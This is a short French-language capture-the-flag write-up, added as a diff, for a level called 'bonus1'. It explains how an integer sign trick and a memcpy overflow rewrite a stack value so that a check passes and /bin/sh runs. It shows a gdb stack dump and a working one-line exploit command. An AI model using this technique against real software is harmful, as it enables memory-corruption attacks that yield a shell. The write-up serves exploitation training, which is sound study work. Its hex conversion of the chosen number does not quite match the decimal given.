@@ -1,0 +1,21 @@
+l'objectif de ce niveau et de passer toute les conditions pour pouvoir executer la commande /bin/sh
+la premiere etape et de trouver un nombre qui sur 4 octects soit negatif pour pouvoir passer le 1er if mais qui sur 2 octects soit positif pour pouvoir reecrire avec la fonction memcpy.
+
+	dec			hexa
+-1073741813 = 0xc0 00 00 0a
+
+une fois le nombre trouve il suffit de le donner en premier argument et en second argument donner la chaine de caractere a reecrire.
+Pour executer la fonction exec il aurais fallut que le nombre que l'on envoie en premier argument soir egal a 0x574f4c46
+
+(gdb) x/24 $esp
+0xbffff610:	0xbffff624	0xbffff84e	0x00000010	0x080482fd
+0xbffff620:	0xb7fd13e4	0x41414141	0x41414141	0x41414141 <-- portion de la memoire reecrit par memcpy
+0xbffff630:	0x41414141	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff640:	0xb7fed280	0x00000000	0x080484b9	0xc0000004 <-- or actuellement il vaut 0xc0000004 dans cette exemple
+0xbffff650:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
+0xbffff660:	0x00000003	0xbffff6f4	0xbffff704	0xb7fdc858
+
+un fois cela compris ul suffit de reecrire les 40 premiers octect comme on veux puis de mettre la valeur 0x574f4c46 pour passer le if et
+executer la commande /bin/sh
+
+./bonus1 -1073741813 $(python -c "print('A' * 40 + '\x46\x4c\x4f\x57')")
